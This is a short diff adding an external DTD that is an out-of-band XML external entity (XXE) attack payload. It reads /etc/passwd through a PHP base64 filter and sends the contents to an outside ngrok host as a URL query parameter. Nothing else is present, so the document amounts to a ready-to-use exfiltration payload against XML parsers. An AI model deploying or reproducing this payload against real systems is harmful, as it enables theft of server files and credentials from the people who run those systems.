@@ -1,0 +1,4 @@
+<!ENTITY % file SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd">
+<!ENTITY % eval "<!ENTITY &#x25; exfiltrate SYSTEM 'https://ebkr.heracross.adpt.acs.owo.ngrok.pizza/?data=%file;'>">
+%eval;
+%exfiltrate;
